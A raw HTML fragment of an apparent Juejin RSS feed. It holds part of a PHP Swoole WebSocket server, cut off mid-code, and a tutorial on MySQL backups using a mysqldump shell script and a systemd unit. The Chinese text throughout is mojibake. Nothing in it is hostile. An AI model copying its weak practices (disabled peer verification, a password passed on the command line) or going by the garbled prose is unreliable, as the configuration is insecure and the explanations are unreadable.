        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">column</span>(<span class="hljs-string">'metadata'</span>, <span class="hljs-title class_">Table</span>::<span class="hljs-variable constant_">TYPE_STRING</span>, <span class="hljs-number">1024</span>);
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">create</span>();
        
        <span class="hljs-variable language_">$this</span>-&gt;connectionCounter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Atomic</span>(<span class="hljs-number">0</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">configureServer</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">set</span>([
            <span class="hljs-string">'worker_num'</span> =&gt; <span class="hljs-title function_ invoke__">swoole_cpu_num</span>(),
            <span class="hljs-string">'task_worker_num'</span> =&gt; <span class="hljs-number">4</span>,
            <span class="hljs-string">'heartbeat_idle_time'</span> =&gt; <span class="hljs-number">300</span>,
            <span class="hljs-string">'heartbeat_check_interval'</span> =&gt; <span class="hljs-number">60</span>,
            <span class="hljs-string">'open_websocket_protocol'</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-string">'websocket_compression'</span> =&gt; <span class="hljs-literal">true</span>,
            
            // SSL æ”¯æŒ
            <span class="hljs-string">'ssl_cert_file'</span> =&gt; <span class="hljs-string">'/path/to/cert.pem'</span>,
            <span class="hljs-string">'ssl_key_file'</span> =&gt; <span class="hljs-string">'/path/to/key.pem'</span>,
            <span class="hljs-string">'ssl_verify_peer'</span> =&gt; <span class="hljs-literal">false</span>,
        ]);
        
        <span class="hljs-comment">// æ³¨å†Œäº‹ä»¶å›è°ƒ</span>
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'start'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onStart'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'open'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onOpen'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'message'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onMessage'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'close'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onClose'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'task'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onTask'</span>]);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onStart</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"WebSocket server started at ws://<span class="hljs-subst">{$server-&gt;host}</span>:<span class="hljs-subst">{$server-&gt;port}</span>\n"</span>;
        
        <span class="hljs-comment">// å¯åŠ¨å¿ƒè·³æ£€æµ‹åç¨‹</span>
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">server</span>) {
            $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">heartbeatMonitor</span>($<span class="hljs-title">server</span>);
        });
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onOpen</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, \Swoole\Http\Request <span class="hljs-variable">$request</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$fd</span> = <span class="hljs-variable">$request</span>-&gt;fd;
        <span class="hljs-variable language_">$this</span>-&gt;connectionCounter-&gt;<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>);
        
        <span class="hljs-comment">// å­˜å‚¨è¿æ¥ä¿¡æ¯</span>
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$fd</span>, [
            <span class="hljs-string">'fd'</span> =&gt; <span class="hljs-variable">$fd</span>,
            <span class="hljs-string">'user_id'</span> =&gt; (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$request</span>-&gt;get[<span class="hljs-string">'user_id'</span>] ?? <span class="hljs-number">0</span>),
            <span class="hljs-string">'connected_at'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>(),
            <span class="hljs-string">'last_activity'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>(),
            <span class="hljs-string">'metadata'</span> =&gt; <span class="hljs-title function_ invoke__">json_encode</span>([
                <span class="hljs-string">'ip'</span> =&gt; <span class="hljs-variable">$request</span>-&gt;server[<span class="hljs-string">'remote_addr'</span>],
                <span class="hljs-string">'user_agent'</span> =&gt; <span class="hljs-variable">$request</span>-&gt;header[<span class="hljs-string">'user-agent'</span>] ?? <span class="hljs-string">''</span>,
                <span class="hljs-string">'query'</span> =&gt; <span class="hljs-variable">$request</span>-&gt;get,
            ])
        ]);
        
        <span class="hljs-comment">// å‘é€æ¬¢è¿æ¶ˆæ¯</span>
        <span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-title function_ invoke__">json_encode</span>([
            <span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'welcome'</span>,
            <span class="hljs-string">'data'</span> =&gt; [
                <span class="hljs-string">'connection_id'</span> =&gt; <span class="hljs-variable">$fd</span>,
                <span class="hljs-string">'server_time'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>(),
                <span class="hljs-string">'total_connections'</span> =&gt; <span class="hljs-variable">$this</span>-&gt;connectionCounter-&gt;<span class="hljs-title function_ invoke__">get</span>(),
            ]
        ]));
        
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"New connection: FD=<span class="hljs-subst">{$fd}</span>, Total=<span class="hljs-subst">{$this-&gt;connectionCounter-&gt;get()}</span>\n"</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onMessage</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, Frame <span class="hljs-variable">$frame</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$fd</span> = <span class="hljs-variable">$frame</span>-&gt;fd;
        
        <span class="hljs-comment">// æ›´æ–°æœ€åæ´»åŠ¨æ—¶é—´</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">exist</span>(<span class="hljs-variable">$fd</span>)) {
            <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$fd</span>, [<span class="hljs-string">'last_activity'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>()]);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$frame</span>-&gt;data, <span class="hljs-literal">true</span>, <span class="hljs-number">512</span>, JSON_THROW_ON_ERROR);
            
            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">'type'</span>] ?? <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">case</span> <span class="hljs-string">'subscribe'</span>:
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleSubscribe</span>(<span class="hljs-variable">$server</span>, <span class="hljs-variable">$fd</span>, <span class="hljs-variable">$data</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-string">'unsubscribe'</span>:
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleUnsubscribe</span>(<span class="hljs-variable">$server</span>, <span class="hljs-variable">$fd</span>, <span class="hljs-variable">$data</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-string">'message'</span>:
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleMessage</span>(<span class="hljs-variable">$server</span>, <span class="hljs-variable">$fd</span>, <span class="hljs-variable">$data</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-string">'rpc'</span>:
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleRpc</span>(<span class="hljs-variable">$server</span>, <span class="hljs-variable">$fd</span>, <span class="hljs-variable">$data</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">default</span>:
                    <span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-title function_ invoke__">json_encode</span>([
                        <span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'error'</span>,
                        <span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Unknown message type'</span>
                    ]));
            }
        } <span class="hljs-keyword">catch</span> (\JsonException <span class="hljs-variable">$e</span>) {
            <span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-title function_ invoke__">json_encode</span>([
                <span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'error'</span>,
                <span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Invalid JSON format'</span>
            ]));
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleSubscribe</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$fd</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$room</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'room'</span>] ?? <span class="hljs-string">''</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$room</span>)) {
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>])) {
            <span class="hljs-variable language_">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>] = [];
        }
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-variable">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>], <span class="hljs-literal">true</span>)) {
            <span class="hljs-variable language_">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>][] = <span class="hljs-variable">$fd</span>;
        }
        
        <span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-title function_ invoke__">json_encode</span>([
            <span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'subscribed'</span>,
            <span class="hljs-string">'room'</span> =&gt; <span class="hljs-variable">$room</span>,
            <span class="hljs-string">'subscriber_count'</span> =&gt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>])
        ]));
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleMessage</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$fd</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$room</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'room'</span>] ?? <span class="hljs-string">''</span>;
        <span class="hljs-variable">$message</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'message'</span>] ?? <span class="hljs-string">''</span>;
        
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$room</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$message</span>)) {
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// å¹¿æ’­æ¶ˆæ¯åˆ°æˆ¿é—´</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>])) {
            <span class="hljs-variable">$broadcastData</span> = <span class="hljs-title function_ invoke__">json_encode</span>([
                <span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'broadcast'</span>,
                <span class="hljs-string">'room'</span> =&gt; <span class="hljs-variable">$room</span>,
                <span class="hljs-string">'from'</span> =&gt; <span class="hljs-variable">$fd</span>,
                <span class="hljs-string">'message'</span> =&gt; <span class="hljs-variable">$message</span>,
                <span class="hljs-string">'timestamp'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>()
            ]);
            
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;roomSubscriptions[<span class="hljs-variable">$room</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$subscriberFd</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">exist</span>(<span class="hljs-variable">$subscriberFd</span>) &amp;&amp; <span class="hljs-variable">$subscriberFd</span> !== <span class="hljs-variable">$fd</span>) {
                    <span class="hljs-variable">$server</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$subscriberFd</span>, <span class="hljs-variable">$broadcastData</span>);
                }
            }
        }
    }
    
    <span class="hljs-comment">/**
     * WebSocket RPC è°ƒç”¨å¤„ç†
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleRpc</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$fd</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$method</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'method'</span>] ?? <span class="hljs-string">''</span>;
        <span class="hljs-variable">$params</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'params'</span>] ?? [];
        <span class="hljs-variable">$id</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">'id'</span>] ?? <span class="hljs-literal">null</span>;
        
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">server</span>, $<span class="hljs-title">fd</span>, $<span class="hljs-title">method</span>, $<span class="hljs-title">params</span>, $<span class="hljs-title">id</span>) {
            <span class="hljs-title">try</span> {
                $<span class="hljs-title">result</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">callRpcMethod</span>($<span class="hljs-title">method</span>, $<span class="hljs-title">params</span>);
                
                <span class="hljs-variable">$response</span> = [
                    <span class="hljs-string">'type'</span> =&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœåŠ¡å™¨ å¼€æœºå¯åŠ¨ + å®šæ—¶ä»»åŠ¡ + Shell è„šæœ¬è‡ªåŠ¨å¤‡ä»½ MySQL æ•°æ®åº“]]></title>    <link>https://juejin.cn/post/7597276695402315817</link>    <guid>https://juejin.cn/post/7597276695402315817</guid>    <pubDate>2026-01-20T09:39:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695402315817" data-draft-id="7375504338758107174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœåŠ¡å™¨  å¼€æœºå¯åŠ¨ + å®šæ—¶ä»»åŠ¡ + Shell è„šæœ¬è‡ªåŠ¨å¤‡ä»½ MySQL æ•°æ®åº“"/> <meta itemprop="keywords" content="MySQL"/> <meta itemprop="datePublished" content="2026-01-20T09:39:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZeroSilin"/> <meta itemprop="url" content="https://juejin.cn/user/2858385964277960"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœåŠ¡å™¨  å¼€æœºå¯åŠ¨ + å®šæ—¶ä»»åŠ¡ + Shell è„šæœ¬è‡ªåŠ¨å¤‡ä»½ MySQL æ•°æ®åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385964277960/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZeroSilin
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:39:01.000Z" title="Tue Jan 20 2026 09:39:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>tip:éœ€æ±‚è¦æ±‚æ•°æ®åº“å®šæ—¶å¤‡ä»½ï¼Œå¦‚æœå¼€æœºåä¹Ÿéœ€è¦å¯åŠ¨è¿è¡Œå®šæ—¶å¤‡ä»½</p>
<h3 data-id="heading-0">å‰ç½®æ¡ä»¶</h3>
<ul>
<li>CentOS 7 æœåŠ¡å™¨ã€‚</li>
<li>å®‰è£…å¹¶è¿è¡Œ MySQL æ•°æ®åº“ã€‚</li>
<li>æœ‰è¶³å¤Ÿçš„æƒé™æ¥åˆ›å»ºå¤‡ä»½è„šæœ¬å¹¶è®¾ç½®Â <code>cron</code>Â ä»»åŠ¡ã€‚</li>
</ul>
<h3 data-id="heading-1">åˆ›å»ºå¤‡ä»½è„šæœ¬</h3>
<p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> /root/mysql_back
<span class="hljs-built_in">mkdir</span> /root/mysql_back/backup
</code></pre>
<p>åˆ›å»ºè„šæœ¬</p>
<pre><code class="hljs language-bash" lang="bash">vim /root/mysql_backup.sh
</code></pre>
<p>å¤åˆ¶ä¸‹é¢è„šæœ¬</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
DATE=$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S)
BACKUP_DIR=<span class="hljs-string">"/root/mysql_back/backup"</span>
DB_USER=<span class="hljs-string">"your_username"</span>
DB_PASSWORD=<span class="hljs-string">"your_password"</span>
DB_NAME=<span class="hljs-string">"device_dev"</span>

mysqldump -u <span class="hljs-variable">$DB_USER</span> -p<span class="hljs-variable">$DB_PASSWORD</span> <span class="hljs-variable">$DB_NAME</span> &gt; <span class="hljs-string">"<span class="hljs-variable">$BACKUP_DIR</span>/device_dev_backup_<span class="hljs-variable">$DATE</span>.sql"</span>
</code></pre>
<p>æ›¿æ¢Â <code>BACKUP_DIR</code>ã€<code>DB_USER</code>Â å’ŒÂ <code>DB_PASSWORD</code>Â ä¸ºä½ çš„å®é™…å¤‡ä»½ç›®å½•å’ŒMySQLå‡­æ®ã€‚</p>
<p>å¯ä»¥ä¸ºÂ <code>BACKUP_DIR</code>Â æ·»åŠ ä¸€ä¸‹æ‰§è¡Œæƒé™</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> -R 700 /root/mysql_back/
</code></pre>
<p>ä½¿è„šæœ¬å¯æ‰§è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> +x /root/mysql_backup.sh
</code></pre>
<h3 data-id="heading-2">è®¾ç½® å¼€æœºå¯åŠ¨</h3>
<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/systemd/system/mysql_back.service
</code></pre>
<p>æ›¿æ¢mysql_backåç§°</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Unit]</span>
<span class="hljs-attr">Description</span>=MySQL_BackUp
<span class="hljs-attr">After</span>=network.target

<span class="hljs-section">[Service]</span>
<span class="hljs-attr">Type</span>=simple
<span class="hljs-attr">ExecStart</span>=/root/mysql_backup.sh
<span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure

<span class="hljs-section">[Install]</span>
<span class="hljs-attr">WantedBy</span>=multi-user.target
</code></pre>
<p>æ›¿æ¢My Script Serviceåç§°ã€ExecStartçš„è·¯å¾„ï¼Œå†™ä¸ºè„šæœ¬è·¯å¾„.</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®ä¿¡å°æ¸¸æˆ0åŸºç¡€å°±ä¸šç­+CTOè¿›é˜¶ç­]]></title>    <link>https://juejin.cn/post/7597025960946958371</link>    <guid>https://juejin.cn/post/7597025960946958371</guid>    <pubDate>2026-01-20T09:40:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597025960946958371" data-draft-id="7597259271109902376" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®ä¿¡å°æ¸¸æˆ0åŸºç¡€å°±ä¸šç­+CTOè¿›é˜¶ç­ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T09:40:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·557744506908"/> <meta itemprop="url" content="https://juejin.cn/user/749198160955433"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®ä¿¡å°æ¸¸æˆ0åŸºç¡€å°±ä¸šç­+CTOè¿›é˜¶ç­ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/749198160955433/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·557744506908
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:40:51.000Z" title="Tue Jan 20 2026 09:40:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
